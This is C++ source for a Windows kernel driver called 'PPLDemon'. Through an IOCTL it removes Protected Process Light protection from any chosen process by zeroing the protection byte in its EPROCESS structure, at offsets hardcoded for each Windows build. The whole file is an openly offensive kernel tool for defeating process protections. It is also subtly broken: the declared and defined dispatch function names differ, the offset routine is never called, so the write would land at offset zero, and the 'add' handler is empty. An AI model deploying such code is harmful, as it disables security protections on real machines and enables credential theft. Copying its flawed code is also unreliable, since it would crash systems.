#include <ntifs.h>
#include <ntstatus.h>
#include <minwindef.h>

#define DRIVER_NAME "PPLDemon"
#define IOCTL_RM_PPL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ADD_PPL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

NTSTATUS DriverCreateClose(PDEVICE_OBJECT, PIRP Irp);
NTSTATUS DeviceIoControl(PDEVICE_OBJECT, PIRP Irp);
VOID DriverUnload(PDRIVER_OBJECT DriverObject);

ULONG ProtectionOffset = 0;
typedef struct _Protection {
	ULONG ProcessId;
} Protection, * PProtection;

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING)
{
	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\PPLDemon");
	UNICODE_STRING symbolicLinkName = RTL_CONSTANT_STRING(L"\\??\\PPLDemon");
	NTSTATUS status;
	PDEVICE_OBJECT DeviceObject = NULL;


	status = IoCreateDevice(
		DriverObject,
		0,
		&deviceName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&DeviceObject
	);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("[%s]: Failed to create device: %08x\n", DRIVER_NAME, status);
		return status;
	}

	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceIoControl;
	DriverObject->DriverUnload = DriverUnload;

	status = IoCreateSymbolicLink(&symbolicLinkName, &deviceName);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("[%s]: Failed to create symbolic link: %08x\n", DRIVER_NAME, status);
		IoDeleteDevice(DeviceObject);
		return status;
	}
	
	return STATUS_SUCCESS;
}

NTSTATUS DriverCreateClose(PDEVICE_OBJECT, PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
	PDEVICE_OBJECT DeviceObject = DriverObject->DeviceObject;
	UNICODE_STRING symbolicLinkName = RTL_CONSTANT_STRING(L"\\??\\PPLDemon");
	IoDeleteSymbolicLink(&symbolicLinkName);
	if (DeviceObject != NULL)
	{
		IoDeleteDevice(DeviceObject);
	}
	DbgPrint("[%s]: Driver unloaded\n", DRIVER_NAME);
}

NTSTATUS GetProtectionOffset() {
	RTL_OSVERSIONINFOW pversion;

	RtlGetVersion(&pversion);

	if (pversion.dwBuildNumber == 9600) {
		ProtectionOffset = 0x67a;
	}
	else if (pversion.dwBuildNumber == 10240) {
		ProtectionOffset = 0x6aa;
	}
	else if (pversion.dwBuildNumber == 10586) {
		ProtectionOffset = 0x6b2;
	}
	else if (pversion.dwBuildNumber == 14393) {
		ProtectionOffset = 0x6c2;
	}
	else if (pversion.dwBuildNumber == 15063) {
		ProtectionOffset = 0x6ca;
	}
	else if (pversion.dwBuildNumber == 16299) {
		ProtectionOffset = 0x6ca;
	}
	else if (pversion.dwBuildNumber == 17134) {
		ProtectionOffset = 0x6ca;
	}
	else if (pversion.dwBuildNumber == 17763) {
		ProtectionOffset = 0x6ca;
	}
	else if (pversion.dwBuildNumber == 18362) {
		ProtectionOffset = 0x6fa;
	}
	else if (pversion.dwBuildNumber >= 19041 && pversion.dwBuildNumber <= 22631) {
		ProtectionOffset = 0x87a;
	}
	else if (pversion.dwBuildNumber >= 26100) {
		ProtectionOffset = 0x5fa;
	}
	else {
		ProtectionOffset = 0;
	}

	if (ProtectionOffset)
		return STATUS_SUCCESS;

	DbgPrint("[%s]: Unsupported Windows build %lu.", DRIVER_NAME, pversion.dwBuildNumber);
	return STATUS_UNSUCCESSFUL;
}

NTSTATUS DriverIoControl(PDEVICE_OBJECT, PIRP Irp)
{
	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
	NTSTATUS status = STATUS_SUCCESS;
	BYTE ProtectionValue;

	if (irpSp->Parameters.DeviceIoControl.IoControlCode == IOCTL_RM_PPL)
	{
		DbgPrint("[%s]: Removing PPL for the process", DRIVER_NAME);
		if (irpSp->Parameters.DeviceIoControl.InputBufferLength < sizeof(Protection)) {
			status = STATUS_BUFFER_TOO_SMALL;
		}
		else {
			PProtection pInfo = (PProtection)Irp->AssociatedIrp.SystemBuffer;
			ULONG Pid = pInfo->ProcessId;
			BYTE ProtectionValue = 0;

			PEPROCESS Process;
			status = PsLookupProcessByProcessId(ULongToHandle(Pid), &Process);
			if (NT_SUCCESS(status)) {
				DbgPrint("[%s]: Found EPROCESS for PID %lu at %p", DRIVER_NAME, Pid, Process);

				ULONG_PTR EProtectionLevel = (ULONG_PTR)Process + ProtectionOffset;
				*(BYTE*)EProtectionLevel = ProtectionValue;

				DbgPrint("[%s]: Removed PPL for PID %lu", DRIVER_NAME, Pid);

				ObDereferenceObject(Process);
				status = STATUS_SUCCESS;
			}
			else {
				status = STATUS_NOT_FOUND;
			}
		}
	}
	else if (irpSp->Parameters.DeviceIoControl.IoControlCode == IOCTL_ADD_PPL)
	{
		DbgPrint("[%s]: Adding PPL for the process", DRIVER_NAME);

	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}